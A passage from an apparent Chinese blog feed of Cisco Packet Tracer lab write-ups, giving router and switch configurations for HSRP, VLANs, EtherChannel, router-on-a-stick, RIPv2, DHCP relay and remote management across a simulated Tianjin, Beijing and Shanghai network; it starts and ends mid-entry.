class="token punctuation">.</span>1<span class="token punctuation">.</span>2 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no shint f0<span class="token operator">/</span>1ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no sh<span class="token keyword">exit</span>ip route 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>2int f0<span class="token operator">/</span>0standby 100 ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>1<span class="token punctuation">.</span>3standby 100 priority 105standby 100 preempt <span class="token keyword">exit</span>Router2配置：enconf tint f0<span class="token operator">/</span>0ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>2<span class="token punctuation">.</span>2 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no shint f0<span class="token operator">/</span>1ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>2 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no shint f1<span class="token operator">/</span>0ip add 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>4<span class="token punctuation">.</span>1 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0no sh<span class="token keyword">exit</span>ip route 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>2<span class="token punctuation">.</span>1ip route 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>3<span class="token punctuation">.</span>1 5</code></pre>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HSRP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络配置之大型综合实验1</title>
      <link href="/2020/11/23/wang-luo-pei-zhi-zhi-da-xing-zong-he-shi-yan-1/"/>
      <url>/2020/11/23/wang-luo-pei-zhi-zhi-da-xing-zong-he-shi-yan-1/</url>
      
        <content type="html"><![CDATA[<h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><ul><li>天津的网络由DHCP-Server1分配IP</li><li>北京的网络由路由器分配IP</li><li>需要做以太网通道</li><li>上海的网关设备三层交换机，上海的DHCP中服务器做中继</li><li>实现全网互通</li><li>交换机和路由器都可以实现内网管理</li></ul><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><h2 id="0x01-DHCP-Server1配置"><a href="#0x01-DHCP-Server1配置" class="headerlink" title="0x01 DHCP-Server1配置"></a>0x01 DHCP-Server1配置</h2><ol><li><p>打开DHCP-Server配置界面，点击【Desktop】选项卡中的【IP Configuration】图标，在IP Configuration界面设置IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DHCP-Server1配置IP.png" alt="DHCP-Server1配置IP"></center></li><li><p>点击【Services】选项卡关闭其他默认开启的服务，保留并设置DHCP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DHCP-Server1配置DHCP服务.png" alt="DHCP-Server1配置DHCP服务"></center></li><li><p>将PC1的IP地址获取设置为DHCP方式，PC1通过DHCP获取DHCP-Server1中serverPool地址池中的地址<code>192.168.30.10</code>，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/验证DNS-Server1配置结果.png" alt="验证DNS-Server1配置结果"></center></li></ol><h2 id="0x02-tj-sw1配置"><a href="#0x02-tj-sw1配置" class="headerlink" title="0x02 tj-sw1配置"></a>0x02 tj-sw1配置</h2><ol><li><p>打开tj-sw1交换机的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookup line console 0exec-timeout 0 0logging synchronousexithostname tj-sw1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw1预配置1.png" alt="tj-sw1预配置"></center></li><li><p>使用如下命令配置tj-sw1的VLAN信息并在<code>f0/4-6</code>接口配置以太链路，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">vlan 100 vlan 10 vlan 20 exit int f0/1 switchport mode access switchport access vlan 100 int f0/2 switchport mode access switchport access vlan 10 int f0/3 switchport mode trunk switchport trunk allowed vlan all int range f0/4-6 switchport mode trunk switchport trunk allowed vlan all channel-group 1 mode on ex</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw配置VLAN.png" alt="tj-sw配置VLAN"></center></li><li><p>使用如下命令开启并配置tj-sw1交换机的远程管理功能，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ex line vty 0 4 pass cisco login exit enable pass cisco int vlan 10 ip add 192.168.10.2 255.255.255.0 no sh ex ip default-gateway 192.168.10.1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw1配置远程管理.png" alt="tj-sw1配置远程管理"></center></li></ol><h2 id="0x03-tj-sw2配置"><a href="#0x03-tj-sw2配置" class="headerlink" title="0x03 tj-sw2配置"></a>0x03 tj-sw2配置</h2><ol><li><p>打开tj-sw2交换机的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname tj-sw2</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw2预配置.png" alt="tj-sw2预配置"></center></li><li><p>使用如下命令配置tj-sw2的VLAN信息并在<code>f0/4-6</code>接口配置以太链路，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">vlan 10 vlan 20 exit int f0/1 switchport mode access switchport access vlan 20 int f0/2 switchport mode access switchport access vlan 10 int range f0/4-6 switchport mode trunk switchport trunk allowed vlan all channel-group 1 mode on</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw2配置VLAN.png" alt="tj-sw2配置VLAN"></center></li><li><p>使用如下命令开启并配置tj-sw2交换机的远程管理功能，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ex line vty 0 4 pass cisco login exit enable pass cisco int vlan 10 ip add 192.168.10.3 255.255.255.0 no sh ex ip default-gateway 192.168.10.1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-sw2配置远程管理.png" alt="tj-sw2配置远程管理"></center></li></ol><h2 id="0x04-tj-R配置"><a href="#0x04-tj-R配置" class="headerlink" title="0x04 tj-R配置"></a>0x04 tj-R配置</h2><ol><li><p>打开tj-R路由器的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">en conf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname tj-R</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-R预配置.png" alt="tj-R预配置"></center></li><li><p>使用如下命令配置tj-R路由器串口的IP地址、速率等信息，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">int s1/0 ip add 223.221.159.1 255.255.255.0 clock rate 9600no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-R串口配置.png" alt="tj-R串口配置"></center></li><li><p>使用单臂路由（如下）实现tj地区各VLAN之间的数据传输，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">int f0/0.1 encapsulation dot1Q 100 ip add 192.168.30.1 255.255.255.0 no sh ip helper-address 192.168.30.254 int f0/0.2 encapsulation dot1Q 10 ip add 192.168.10.1 255.255.255.0 no sh ip helper-address 192.168.30.254 int f0/0.3 encapsulation dot1Q 20 ip add 192.168.20.1 255.255.255.0 no sh ip helper-address 192.168.30.254 int f0/0 no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-R单臂路由.png" alt="tj-R单臂路由"></center></li><li><p>使用如下命令配置tj-R的路由，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ex router rip version 2 network 192.168.10.0 network 192.168.20.0 network 192.168.30.0 network 223.221.159.0</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-R路由配置.png" alt="tj-R路由配置"></center></li><li><p>使用如下命令开启并配置tj-R路由器的远程管理，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ex line vty 0 4 pass cisco login exit enable pass cisco</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/tj-R远程管理配置.png" alt="tj-R远程管理配置"></center></li></ol><h2 id="0x05-ISP-A配置"><a href="#0x05-ISP-A配置" class="headerlink" title="0x05 ISP-A配置"></a>0x05 ISP-A配置</h2><ol><li><p>打开tj-R路由器的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">en conf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname ISP-B</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/ISP-R预配置.png" alt="ISP-R预配置"></center></li><li><p>使用如下命令配置ISP-A路由器的接口地址，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">int f0/0ip add 111.111.111.1 255.255.255.0no shint s1/0ip add 223.221.159.2 255.255.255.0no shint s1/1ip add 223.11.115.1 255.255.255.0clock rate 9600no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/ISP-A接口配置.png" alt="ISP-A接口配置"></center></li><li><p>使用如下命令配置路由，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">router rip version 2 network 111.111.111.0 network 223.11.115.0network 223.221.159.0</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/ISP-R配置路由.png" alt="ISP-R配置路由"></center></li></ol><h2 id="0x06-ISP-sw配置"><a href="#0x06-ISP-sw配置" class="headerlink" title="0x06 ISP-sw配置"></a>0x06 ISP-sw配置</h2><h2 id="0x07-Web-Server配置"><a href="#0x07-Web-Server配置" class="headerlink" title="0x07 Web-Server配置"></a>0x07 Web-Server配置</h2><ol><li><p>打开Web-Server配置界面，点击【Desktop】选项卡中的【IP Configuration】图标，在IP Configuration界面设置IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/Web-Server配置IP.png" alt="Web-Server配置IP"></center></li><li><p>点击【Services】选项卡关闭其他默认开启的服务，保留并设置HTTP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/Web-Server配置HTTP服务.png" alt="Web-Server配置HTTP服务"></center></li></ol><h2 id="0x08-DNS-Server配置"><a href="#0x08-DNS-Server配置" class="headerlink" title="0x08 DNS-Server配置"></a>0x08 DNS-Server配置</h2><ol><li><p>打开DNS-Server配置界面，点击【Desktop】选项卡中的【IP Configuration】图标，在IP Configuration界面设置IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DNS-Server配置IP.png" alt="DNS-Server配置IP"></center></li><li><p>点击【Services】选项卡关闭其他默认开启的服务，保留并设置DNS服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DNS-Server配置DNS.png" alt="DNS-Server配置DNS"></center></li></ol><h2 id="0x09-bj-R配置"><a href="#0x09-bj-R配置" class="headerlink" title="0x09 bj-R配置"></a>0x09 bj-R配置</h2><ol><li><p>打开bj-R路由器的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">en conf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname bj-R</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R预配置.png" alt="bj-R预配置"></center></li><li><p>使用如下命令配置bj-R路由器串口的IP地址等信息，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">int s1/0 ip add 223.11.115.2 255.255.255.0 no shint f0/1ip add 223.22.115.1 255.255.255.0no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R串口配置.png" alt="bj-R串口配置"></center></li><li><p>使用单臂路由（如下）实现bj地区各VLAN之间的数据传输，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">int f0/0.1 encapsulation dot1Q 100 ip add 192.168.100.1 255.255.255.0 no sh int f0/0.2 encapsulation dot1Q 200 ip add 192.168.101.1 255.255.255.0 no sh int f0/0 no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R单臂路由实现.png" alt="bj-R单臂路由实现"></center></li><li><p>使用如下命令配置bj-R的DHCP服务，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ip dhcp pool vlan100 network 192.168.100.0 255.255.255.0 default-router 192.168.100.1 dns-server 111.111.111.254ex ip dhcp excluded-address 192.168.100.1 192.168.100.10 ip dhcp pool vlan200 network 192.168.101.0 255.255.255.0 default-router 192.168.101.1 dns-server 111.111.111.254ex ip dhcp excluded-address 192.168.101.1 192.168.101.10</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R实现DHCP1.png" alt="bj-R实现DHCP"></center></li><li><p>使用如下命令配置bj-R的路由，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">router rip version 2 network 192.168.100.0 network 192.168.101.0 network 223.11.115.0network 223.22.115.0</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R配置路由.png" alt="bj-R配置路由"></center></li><li><p>使用如下命令开启并配置bj-R路由器的远程管理，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">ex line vty 0 4 pass cisco login exit enable pass cisco</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-R远程管理配置.png" alt="bj-R远程管理配置"></center></li></ol><h2 id="0x10-bj-sw配置"><a href="#0x10-bj-sw配置" class="headerlink" title="0x10 bj-sw配置"></a>0x10 bj-sw配置</h2><ol><li><p>打开bj-sw交换机的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf tno ip domain-lookup line console 0exec-timeout 0 0logging synchronousexithostname bj-sw</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-sw预配置.png" alt="bj-sw预配置"></center></li><li><p>使用如下命令配置bj-sw的VLAN信息，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">vlan 100 vlan 200exit int f0/1 switchport mode access switchport access vlan 100 int f0/2 switchport mode access switchport access vlan 200int f0/3 switchport mode trunk switchport trunk allowed vlan allex</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-sw配置VLAN.png" alt="bj-sw配置VLAN"></center></li><li><p>使用如下命令开启并配置bj-sw交换机的远程管理功能，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">line vty 0 4 pass cisco login exit enable pass cisco int vlan 100ip add 192.168.100.2 255.255.255.0 no sh ex ip default-gateway 192.168.100.1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/bj-sw配置远程管理.png" alt="bj-sw配置远程管理"></center></li></ol><h2 id="0x11-sh-sw1配置"><a href="#0x11-sh-sw1配置" class="headerlink" title="0x11 sh-sw1配置"></a>0x11 sh-sw1配置</h2><ol><li><p>打开sh-sw1交换机的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname sh-sw1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw1预配置.png" alt="sh-sw1预配置"></center></li><li><p>使用如下命令配置sh-sw1的VLAN信息，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">vlan 100vlan 200exit int vlan 100ip address 192.168.200.1 255.255.255.0ip helper-address 192.168.201.254no shint vlan 200ip add 192.168.201.1 255.255.255.0ip helper-address 192.168.201.254no shint f0/1switchport trunk encapsulation dot1q switchport mode trunk switchport trunk allowed vlan all </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw1配置VLAN.png" alt="sh-sw1配置VLAN"></center></li><li><p>使用如下命令配置三层交换机接口，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">exitip routingint f0/2no switchport ip add 223.22.115.2 255.255.255.0no sh</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw1配置接口.png" alt="sh-sw1配置接口"></center></li><li><p>使用如下命令配置路由，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">route ripversion 2network 223.22.115.0network 192.168.200.0network 192.168.201.0</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw配置路由.png" alt="sh-sw配置路由"></center></li><li><p>使用如下命令开启并配置sh-sw1交换机的远程管理功能，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">line vty 0 4 pass cisco login exit enable pass cisco </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw1配置远程管理.png" alt="sh-sw1配置远程管理"></center></li></ol><h2 id="0x12-sh-sw2配置"><a href="#0x12-sh-sw2配置" class="headerlink" title="0x12 sh-sw2配置"></a>0x12 sh-sw2配置</h2><ol><li><p>打开sh-sw2交换机的【CLI】选项卡中使用如下命令配置一下设备的基础环境，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">enconf t no ip domain-lookup line console 0 exec-timeout 0 0 logging syn exit hostname sh-sw2</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw2预配置.png" alt="sh-sw2预配置"></center></li><li><p>使用如下命令配置sh-sw2的VLAN信息，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">vlan 100vlan 200exit int f0/1 switchport mode access switchport access vlan 100int f0/2 switchport mode access switchport access vlan 200int f0/3switchport mode trunk switchport trunk allowed vlan all </code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw2配置VLAN.png" alt="sh-sw2配置VLAN"></center></li><li><p>使用如下命令开启并配置sh-sw2交换机的远程管理功能，操作结果如下图所示。</p><pre class=" language-shell"><code class="language-shell">line vty 0 4 pass cisco login exit enable pass cisco int vlan 100ip add 192.168.200.3 255.255.255.0 no sh ex ip default-gateway 192.168.200.1</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/sh-sw2配置远程管理.png" alt="sh-sw2配置远程管理"></center></li></ol><h2 id="0x13-DHCP-Server2配置"><a href="#0x13-DHCP-Server2配置" class="headerlink" title="0x13 DHCP-Server2配置"></a>0x13 DHCP-Server2配置</h2><ol><li><p>打开DHCP-Server2配置界面，点击【Desktop】选项卡中的【IP Configuration】图标，在IP Configuration界面设置IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DHCP-Server2配置IP2.png" alt="DHCP-Server2配置IP2"></center></li><li><p>点击【Services】选项卡关闭其他默认开启的服务，保留并设置DHCP服务，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/DHCP-Server2配置DHCP服务.png" alt="DHCP-Server2配置DHCP服务"></center></li></ol><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><ol><li><p>PC1设置DHCP后从DHCP-Server1中获取IP地址，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/PC1自动获取IP.png" alt="PC1自动获取IP"></center></li><li><p>PC4设置DHCP后从bj-R路由器获取IP地址，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/PC4获取IP.png" alt="PC4获取IP"></center></li><li><p>PC6设置DHCP后从DHCP-Server2获取IP地址，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/PC6获取IP.png" alt="PC6获取IP"></center></li><li><p>PC2可以访问<code>www.baidu.com</code>，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/访问网站.png" alt="访问网站"></center></li><li><p>PC5远程管理bj-sw交换机，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/PC5远程管理交换机.png" alt="PC5远程管理交换机"></center></li><li><p>PC5远程管理bj-R路由器，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/ComExperiment/PC5远程管理路由器.png" alt="PC5远程管理路由器"></center></li></ol><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><ul><li>与单臂路由相连的交换机上需要配置局域网内使用到的所有VLAN</li><li>三层交换机默认做二层交换机使用，若想使用三层功能需要使用<code>ip routing</code>命令开启。</li><li>三层交换机的接口模式工作在二层，做三层接口时需要先使用<code>no switchport</code>命令转一下。</li><li>二层交换机默认封装了<code>dot1q</code>协议，但三层交换机默认不封装，使用时需要手动封装。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VLAN综合实验</title>
      <link href="/2020/11/22/vlan-zong-he-shi-yan/"/>
      <url>/2020/11/22/vlan-zong-he-shi-yan/</url>
      
        <content type="html"><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/实验要求.png" alt="实验要求"></center><h1 id="实验分析"><a href="#实验分析" class="headerlink" title="实验分析"></a>实验分析</h1><ul><li>tj-R：单臂路由实现VLAN间通信</li><li>tj-sw：以太网链路实现</li><li>bj-R：单臂路由实现VLAN间通信；DHCP服务</li><li>R、SW：开启远程管理</li><li>路由协议采用RIPv2</li></ul><h1 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h1><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/实验拓扑.png" alt="实验拓扑"></center><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="0x01-DHCP-Server配置"><a href="#0x01-DHCP-Server配置" class="headerlink" title="0x01 DHCP-Server配置"></a>0x01 DHCP-Server配置</h2><ol><li><p>打开DHCP-Server配置界面设置IP信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/DHCP-Server设置IP.png" alt="DHCP-Server设置IP"></center></li><li><p>打开DHCP-Server服务配置界面，开启并配置DHCP服务操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/DHCP服务设置.png" alt="DHCP服务设置"></center></li></ol><h2 id="0x02-tj-sw1配置"><a href="#0x02-tj-sw1配置" class="headerlink" title="0x02 tj-sw1配置"></a>0x02 tj-sw1配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/tj-sw1配置.png" alt="tj-sw1配置"></center><h2 id="0x03-tj-sw2配置"><a href="#0x03-tj-sw2配置" class="headerlink" title="0x03 tj-sw2配置"></a>0x03 tj-sw2配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/tj-sw配置.png" alt="tj-sw配置"></center><h2 id="0x04-tj-R配置"><a href="#0x04-tj-R配置" class="headerlink" title="0x04 tj-R配置"></a>0x04 tj-R配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/tj-R配置.png" alt="tj-R配置"></center><h2 id="0x05-ISP-A配置"><a href="#0x05-ISP-A配置" class="headerlink" title="0x05 ISP-A配置"></a>0x05 ISP-A配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/ISP-A路由配置.png" alt="ISP-A路由配置"></center><h2 id="0x06-ISP-B配置"><a href="#0x06-ISP-B配置" class="headerlink" title="0x06 ISP-B配置"></a>0x06 ISP-B配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/ISP-B配置.png" alt="ISP-B配置"></center><h2 id="0x07-bj-R配置"><a href="#0x07-bj-R配置" class="headerlink" title="0x07 bj-R配置"></a>0x07 bj-R配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/bj-R配置.png" alt="bj-R配置"></center><h2 id="0x08-bj-w配置"><a href="#0x08-bj-w配置" class="headerlink" title="0x08 bj-w配置"></a>0x08 bj-w配置</h2><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/bj-w配置.png" alt="bj-w配置"></center><h2 id="0x09-Web-Server配置"><a href="#0x09-Web-Server配置" class="headerlink" title="0x09 Web-Server配置"></a>0x09 Web-Server配置</h2><ol><li><p>打开Web-Server的Desktop配置界面设置IP操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/Web-Server配置IP.png" alt="Web-Server配置IP"></center></li><li><p>打开Web-Server服务配置界面，开启HTTP服务操作解雇如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/Web-Server配置HTTP服务.png" alt="Web-Server配置HTTP服务"></center></li></ol><h2 id="0x10-DNS-Server配置"><a href="#0x10-DNS-Server配置" class="headerlink" title="0x10 DNS-Server配置"></a>0x10 DNS-Server配置</h2><ol><li><p>打开DNS-Server的Desktop配置界面设置IP操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/DNS-Server配置IP.png" alt="DNS-Server配置IP"></center></li><li><p>打开DNS-Server服务配置界面，开启DNS服务操作解雇如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/DNS-Server配置DNS.png" alt="DNS-Server配置DNS"></center></li></ol><h1 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h1><ol><li><p>PC1通过DHCP获取到的IP地址如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/PC1获取到的动态IP.png" alt="PC1获取到的动态IP"></center></li><li><p>PC4通过DHCP获取到的IP地址如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/PC4获取到的动态IP.png" alt="PC4获取到的动态IP"></center></li><li><p>PC2访问<code>www.baidu.com</code>显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/PC2访问网站.png" alt="PC2访问网站"></center></li><li><p>PC3远程管理tj-sw1操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/远程管理tj-sw1.png" alt="远程管理tj-sw1"></center></li><li><p>PC3远程管理tj-R操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/VLAN/远程管理tj-R.png" alt="远程管理tj-R"></center></li><li><p>PC5远程管理bj-sw操作结果如下图所示。</p><center><img 